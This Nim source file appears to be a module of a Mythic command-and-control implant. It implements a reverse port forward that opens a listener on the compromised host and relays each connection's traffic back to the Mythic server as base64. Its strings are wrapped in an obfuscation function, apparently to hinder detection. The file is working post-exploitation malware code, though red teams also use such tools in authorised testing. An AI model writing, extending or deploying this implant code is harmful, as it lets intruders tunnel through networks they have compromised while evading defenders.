import std/[json, net, nativesockets, strutils, base64, strformat, tables, random, os]
import ../config
import ../utils/m_responses
import ../utils/strenc

const
  BUFFER_SIZE = 8192

type
  RpfwdMessage* = object
    exit*: bool
    server_id*: uint32
    data*: string  # base64 encoded, empty if none
    port*: int     # listening port
  
  RpfwdConnectionState = enum
    Connected
    Closed
  
  RpfwdConnectionObj = object
    serverId: uint32
    state: RpfwdConnectionState
    socket: Socket
    active: bool
    receivedEof: bool  # True when reader thread sends empty seq EOF signal
    inChannel: ptr Channel[seq[byte]]   # Mythic → Writer → Socket
    outChannel: ptr Channel[seq[byte]]  # Socket → Reader → Mythic
    readerThread: Thread[ptr RpfwdConnectionObj]
    writerThread: Thread[ptr RpfwdConnectionObj]
  
  RpfwdConnection = ref object
    serverId: uint32
    state: RpfwdConnectionState
    socket: Socket
    active: bool
    receivedEof: bool
    inChannel: ptr Channel[seq[byte]]
    outChannel: ptr Channel[seq[byte]]
    readerThread: Thread[ptr RpfwdConnectionObj]
    writerThread: Thread[ptr RpfwdConnectionObj]
    sharedPtr: ptr RpfwdConnectionObj  # Stable pointer for threads
  
  RpfwdListenerObj = object
    taskId: string
    port: int
    remoteIp: string
    remotePort: int
    active: bool
    listenerSocket: Socket
    connections: Table[uint32, RpfwdConnection]
    acceptThread: Thread[ptr RpfwdListenerObj]
  
  RpfwdListener = ref object
    taskId: string
    port: int
    remoteIp: string
    remotePort: int
    active: bool
    listenerSocket: Socket
    connections: Table[uint32, RpfwdConnection]
    acceptThread: Thread[ptr RpfwdListenerObj]
    sharedPtr: ptr RpfwdListenerObj  # Stable pointer for thread

var
  activeRpfwdListeners {.threadvar.}: Table[string, RpfwdListener]
  rpfwdActive* = false

proc createRpfwdMessage*(serverId: uint32, exit: bool, port: int, data: string = ""): JsonNode =
  ## Create an RPfwd message to send to Mythic
  result = %*{
    obf("server_id"): serverId,
    obf("exit"): exit,
    obf("port"): port
  }
  if data.len > 0:
    result[obf("data")] = %data

proc readFromDestination(conn: ptr RpfwdConnectionObj) {.thread.} =
  ## Thread that reads from remote socket and sends to Mythic via main thread
  var buffer = newSeq[byte](BUFFER_SIZE)
  
  while conn[].active:
    try:
      let bytesRead = conn[].socket.recv(addr buffer[0], BUFFER_SIZE)
      
      if bytesRead == 0:
        # Connection closed by remote
        conn[].active = false
        # Signal EOF
        conn[].outChannel[].send(@[])
        break
      elif bytesRead > 0:
        # Send data to main thread for forwarding to Mythic
        conn[].outChannel[].send(buffer[0..<bytesRead])
      elif bytesRead < 0:
        # Non-blocking socket would block - no data available
        sleep(1)  # Sleep 1ms to avoid busy-waiting
      
    except:
      # Socket error - connection closed or reset
      conn[].active = false
      conn[].outChannel[].send(@[])
      break
  
  # Thread exiting - DON'T close socket here, let cleanup happen in checkActiveRpfwdConnections
  # to avoid race with writer thread

proc writeToDestination(conn: ptr RpfwdConnectionObj) {.thread.} =
  ## Thread that receives data from Mythic and writes to remote socket
  var shouldExit = false
  while not shouldExit:
    # Use blocking recv() with timeout to ensure we don't miss messages
    let (available, data) = conn[].inChannel[].tryRecv()
    if available:
      if data.len == 0:
        # Empty message means exit
        break
      var sent = 0
      while sent < data.len:
        try:
          let bytesSent = conn[].socket.send(unsafeAddr data[sent], data.len - sent)
          if bytesSent > 0:
            sent += bytesSent
          else:
            # send returned 0 on non-blocking socket, yield and retry
            sleep(1)  # Sleep 1ms to avoid busy-waiting
        except OSError as e:
          # Treat EWOULDBLOCK/WSAEWOULDBLOCK as congestion, yield and retry
          when defined(windows):
            const WsaWouldBlock = 10035'i32
            if e.errorCode.int32 == WsaWouldBlock:
              sleep(1)  # Sleep 1ms to avoid busy-waiting
              continue
          else:
            const EwouldBlock = 11'i32
            if e.errorCode.int32 == EwouldBlock:
              sleep(1)  # Sleep 1ms to avoid busy-waiting
              continue
          # Any other error closes the connection
          shouldExit = true
          break
        except AssertionDefect:
          # Socket was closed - this can happen during shutdown
          shouldExit = true
          break
    else:
      # No data available - check if we should exit
      if not conn[].active:
        shouldExit = true
      else:
        # Sleep briefly when no data to avoid busy-waiting
        sleep(1)  # Sleep 1ms

proc acceptConnections(listener: ptr RpfwdListenerObj) {.thread.} =
  ## Thread that accepts incoming connections and creates connection handlers
  while listener[].active:
    try:
      # Accept incoming connection (blocking call)
      var clientSocket: Socket
      listener[].listenerSocket.accept(clientSocket)
      
      if not listener[].active:
        # Listener was stopped during accept, close client and exit
        clientSocket.close()
        break
      
      # Generate unique server_id for this connection
      # Use rand to generate a random int, then convert to uint32
      let serverId = rand(int.high).uint32
      
      # Set socket to non-blocking mode
      clientSocket.getFd().setBlocking(false)
      
      # Create connection object
      var conn = RpfwdConnection(
        serverId: serverId,
        state: Connected,
        socket: clientSocket,
        active: true,
        receivedEof: false
      )
      
      # Allocate stable pointer for threads
      conn.sharedPtr = cast[ptr RpfwdConnectionObj](alloc0(sizeof(RpfwdConnectionObj)))
      
      # Allocate and initialize channels
      conn.inChannel = cast[ptr Channel[seq[byte]]](alloc0(sizeof(Channel[seq[byte]])))
      conn.outChannel = cast[ptr Channel[seq[byte]]](alloc0(sizeof(Channel[seq[byte]])))
      conn.inChannel[].open()
      conn.outChannel[].open()
      
      # Initialize shared object for threads
      conn.sharedPtr[].serverId = serverId
      conn.sharedPtr[].state = Connected
      conn.sharedPtr[].socket = clientSocket
      conn.sharedPtr[].active = true
      conn.sharedPtr[].receivedEof = false
      conn.sharedPtr[].inChannel = conn.inChannel
      conn.sharedPtr[].outChannel = conn.outChannel
      
      # Start reader and writer threads
      createThread(conn.readerThread, readFromDestination, conn.sharedPtr)
      createThread(conn.writerThread, writeToDestination, conn.sharedPtr)
      
      # Store connection
      listener[].connections[serverId] = conn
      
      # Connection accepted - main loop will detect new connection via checkActiveRpfwdConnections
      
    except:
      # Accept error - listener might be closing
      if listener[].active:
        # Unexpected error, sleep briefly before retry
        sleep(100)

proc rpfwd*(taskId: string, params: JsonNode): JsonNode =
  ## Start/stop reverse port forward
  let action = params{obf("action")}.getStr(obf("start"))
  
  if action == obf("stop"):
    # Stop existing listener
    if activeRpfwdListeners.hasKey(taskId):
      let listener = activeRpfwdListeners[taskId]
      listener.active = false
      listener.sharedPtr[].active = false
      
      # Close listener socket (will break accept thread)
      try:
        listener.listenerSocket.close()
      except:
        discard
      
      # Wait for accept thread
      joinThread(listener.acceptThread)
      
      # Close all connections
      for serverId, conn in listener.connections:
        conn.active = false
        conn.sharedPtr[].active = false
        try:
          conn.socket.close()
        except:
          discard
        
        # Wait for threads
        joinThread(conn.readerThread)
        joinThread(conn.writerThread)
        
        # Clean up channels and memory
        conn.inChannel[].close()
        conn.outChannel[].close()
        dealloc(conn.inChannel)
        dealloc(conn.outChannel)
        dealloc(conn.sharedPtr)
      
      # Clean up listener
      dealloc(listener.sharedPtr)
      activeRpfwdListeners.del(taskId)
      rpfwdActive = activeRpfwdListeners.len > 0
      
      return mythicSuccess(taskId, obf("Reverse port forward stopped successfully") &
        fmt" on port {listener.port}")
    else:
      return mythicError(taskId, obf("No active reverse port forward for this task"))
  
  # Start new listener
  let port = params[obf("port")].getInt()
  let remoteIp = params[obf("remote_ip")].getStr()
  let remotePort = params[obf("remote_port")].getInt()
  
  # Create listener socket
  var listenerSocket = newSocket()
  listenerSocket.setSockOpt(OptReuseAddr, true)
  listenerSocket.getFd().setBlocking(true)  # Accept thread uses blocking accept
  
  try:
    listenerSocket.bindAddr(Port(port), obf("0.0.0.0"))
    listenerSocket.listen()
  except OSError as e:
    return mythicError(taskId, obf("Failed to start listener on port ") & $port &
      ": " & e.msg)
  
  # Create listener object
  var listener = RpfwdListener(
    taskId: taskId,
    port: port,
    remoteIp: remoteIp,
    remotePort: remotePort,
    active: true,
    listenerSocket: listenerSocket,
    connections: initTable[uint32, RpfwdConnection]()
  )
  
  # Allocate stable pointer for accept thread
  listener.sharedPtr = cast[ptr RpfwdListenerObj](alloc0(sizeof(RpfwdListenerObj)))
  listener.sharedPtr[].taskId = taskId
  listener.sharedPtr[].port = port
  listener.sharedPtr[].remoteIp = remoteIp
  listener.sharedPtr[].remotePort = remotePort
  listener.sharedPtr[].active = true
  listener.sharedPtr[].listenerSocket = listenerSocket
  listener.sharedPtr[].connections = listener.connections
  
  # Start accept thread
  createThread(listener.acceptThread, acceptConnections, listener.sharedPtr)
  
  # Store listener
  activeRpfwdListeners[taskId] = listener
  rpfwdActive = true
  
  # Return "processing" status - task continues in background
  let msg = obf("Reverse port forward started on port ") & $port &
    obf(", forwarding to ") & remoteIp & ":" & $remotePort
  return mythicProcessing(taskId, msg)

proc handleRpfwdMessages*(messages: seq[JsonNode]): seq[JsonNode] =
  ## Process RPfwd messages from Mythic (data to send to connections)
  var responses: seq[JsonNode] = @[]
  let cfg = getConfig()
  
  # Sync connections table with accept thread FIRST
  for taskId, listener in activeRpfwdListeners:
    listener.connections = listener.sharedPtr[].connections
  
  for msg in messages:
    let serverId = msg[obf("server_id")].getInt().uint32
    let exit = msg.getOrDefault(obf("exit")).getBool(false)
    
    # Find connection with this server_id across all listeners
    var foundConn: RpfwdConnection = nil
    for taskId, listener in activeRpfwdListeners:
      if listener.connections.hasKey(serverId):
        foundConn = listener.connections[serverId]
        break
    
    if foundConn == nil:
      # Connection not found - might have closed already
      continue
    
    if exit:
      # Close this connection - just mark inactive, don't close socket yet
      # Writer thread may still have data to send
      foundConn.active = false
      foundConn.sharedPtr[].active = false
      # Don't close socket here - let writer thread finish and cleanup will happen later
      continue
    
    # Forward data to connection
    if msg.hasKey(obf("data")):
      let dataB64 = msg[obf("data")].getStr()
      if dataB64.len > 0:
        let decoded = decode(dataB64)
        var dataBytes = newSeq[byte](decoded.len)
        for i in 0..<decoded.len:
          dataBytes[i] = decoded[i].byte
        
        # Send to writer thread via channel
        foundConn.inChannel[].send(dataBytes)
  
  return responses

proc checkActiveRpfwdConnections*(): seq[JsonNode] =
  ## Check all active RPfwd connections for data to send to Mythic
  ## Called from main agent loop every iteration
  var responses: seq[JsonNode] = @[]
  let cfg = getConfig()
  
  if not rpfwdActive:
    return responses
  
  for taskId, listener in activeRpfwdListeners:
    var closedConnections: seq[uint32] = @[]
    
    # Sync connections table with shared pointer (new connections added by accept thread)
    listener.connections = listener.sharedPtr[].connections
    
    for serverId, conn in listener.connections:
      # Sync active state
      conn.active = conn.sharedPtr[].active
      conn.receivedEof = conn.sharedPtr[].receivedEof
      
      # Check for data from reader thread
      let (available, data) = conn.outChannel[].tryRecv()
      if available:
        if data.len == 0:
          # EOF signal - connection closed
          conn.receivedEof = true
          conn.active = false
          conn.sharedPtr[].active = false
          
          # Send exit message to Mythic
          responses.add(createRpfwdMessage(serverId, true, listener.port))
          closedConnections.add(serverId)
        else:
          # Data to forward to Mythic
          let dataB64 = encode(data)
          responses.add(createRpfwdMessage(serverId, false, listener.port, dataB64))
      
      # Check if connection is dead (not active and received EOF)
      if not conn.active and conn.receivedEof:
        closedConnections.add(serverId)
    
    # Clean up closed connections
    for serverId in closedConnections:
      if listener.connections.hasKey(serverId):
        let conn = listener.connections[serverId]
        
        # Close socket
        try:
          conn.socket.close()
        except:
          discard
        
        # Wait for threads
        joinThread(conn.readerThread)
        joinThread(conn.writerThread)
        
        # Clean up channels and memory
        conn.inChannel[].close()
        conn.outChannel[].close()
        dealloc(conn.inChannel)
        dealloc(conn.outChannel)
        dealloc(conn.sharedPtr)
        
        # Remove from table
        listener.connections.del(serverId)
        listener.sharedPtr[].connections.del(serverId)
  
  return responses
